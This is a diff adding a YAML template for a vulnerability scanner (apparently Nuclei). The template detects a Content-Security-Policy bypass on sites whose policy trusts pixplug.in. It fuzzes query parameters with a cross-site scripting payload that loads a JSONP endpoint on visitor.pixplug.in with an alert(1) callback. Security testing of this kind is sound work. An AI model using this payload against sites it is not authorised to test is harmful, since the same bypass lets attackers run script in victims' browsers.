@@ -1,0 +1,55 @@
+id: pixplug-visitor-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - PixPlug Visitor
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,pixplug-visitor,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "pixplug.in"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: pixplug_visitor_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://visitor.pixplug.in/jsonp/getdata.php?callback=alert(1)"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "pixplug_visitor_csp_xss == true"
+# digest: 490a0046304402206e02ec77935b1e801efb854ec4ca2e225a6e07274a6b24aa3a0b507a35cab8f6022041b84e9dc2e13facb858d88204b87943f087556722f9a90ca2f362e930fe7329:922c64590222798bb761d5b6d8e72950
